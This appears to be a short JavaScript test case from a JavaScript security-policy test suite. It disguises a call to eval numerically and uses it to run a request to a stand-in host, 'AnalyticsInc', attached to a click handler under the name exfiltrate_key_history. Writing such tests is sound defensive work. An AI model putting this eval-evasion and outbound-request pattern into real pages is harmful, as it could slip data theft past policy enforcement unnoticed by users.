function exfiltrate_key_history() {
  var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=eval3", true);xmlhttp.send(null);';
  var v2 = (490837).toString(8 << 2) + "";
  if(JAM.isEval(eval)) {
    var v0 = eval("introspect(JAM.policy.pFull) { " + v2 + " }")
  }else {
    var v0 = JAM.call(eval, null, [v2])
  }
  JAM.call(v0, null, [exp]);
  return
}
JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history)
